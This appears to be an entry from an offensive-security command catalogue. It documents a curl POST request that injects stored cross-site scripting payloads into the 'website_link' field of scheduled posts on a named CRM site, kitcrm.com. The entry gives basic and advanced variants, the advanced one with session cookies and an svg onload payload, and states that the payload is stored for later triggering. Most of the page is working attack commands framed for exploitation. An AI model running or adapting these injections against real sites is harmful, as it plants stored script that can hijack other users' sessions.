---
id: cmd-create-scheduled-post-xss
data: >-
  curl -X POST 'https://kitcrm.com/pages/175422/manual_posts/31163' -H
  'Content-Type: multipart/form-data;
  boundary=-----------------------------15916813141840537191014403553' -F
  'website_link=javascript:alert("XSS")' -F 'other_form_fields=...' # Adapt with
  full multipart body and auth headers
tags:
  - http-post
  - xss-injection
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:25.180Z'
verified: false
validated: true
submitted: true
---
# create-scheduled-post-with-xss

## Command

```bash
curl -X POST 'https://kitcrm.com/pages/175422/manual_posts/31163' \
  -H 'Content-Type: multipart/form-data; boundary=-----------------------------15916813141840537191014403553' \
  -F 'website_link=javascript:alert("XSS")' \
  -F 'title=Test Post' \
  -F 'content=Test Content' \
  # Include all other required form fields and authentication cookies/headers
```

## Description

This command sends a modified HTTP POST request to create or update a scheduled post in the Kit app, injecting an XSS payload into the 'website_link' field. It mimics the intercepted request structure for exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `URL` | Target endpoint with page_id and post_id | Yes |
| `-H 'Content-Type: ...'` | Sets multipart/form-data boundary | Yes |
| `-F 'website_link=...'` | The field to inject payload (e.g., javascript:alert('XSS')) | Yes |
| `-F 'other_fields=...'` | Additional form fields from original request | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://kitcrm.com/pages/175422/manual_posts/31163' -F 'website_link=javascript:alert(1)'
```

### Advanced Usage

```bash
curl -X POST 'https://kitcrm.com/pages/175422/manual_posts/31163' \
  -H 'Cookie: session=abc123' \
  -H 'Content-Type: multipart/form-data; boundary=----' \
  -F 'website_link=<svg onload=alert("XSS")>' \
  -F 'post_data=full_body'
```

## Expected Output

HTTP 200 OK response with JSON or HTML confirming post creation/modification. The payload is now stored for later triggering.

## Related

- [[procedures/Inject-XSS-Payload-into-Website-Link]]
